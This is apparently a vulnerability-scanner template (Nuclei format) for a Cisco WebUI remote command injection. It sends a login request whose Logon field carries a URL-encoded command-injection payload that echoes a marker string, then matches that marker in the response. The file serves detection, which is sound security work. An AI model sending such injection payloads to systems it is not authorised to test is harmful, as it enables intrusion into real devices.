id: cisco-webui-rce
info:
  name: Cisco WebUI 1.5b6 RCE
  author: pikpikcu
  severity: critical
  refrence: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190513-webui

requests:
  - method: GET
    path:
      - '{{BaseURL}}/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20TestPoc%3B%27'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "TestPoc"
        part: body

      - type: status
        status:
          - 200
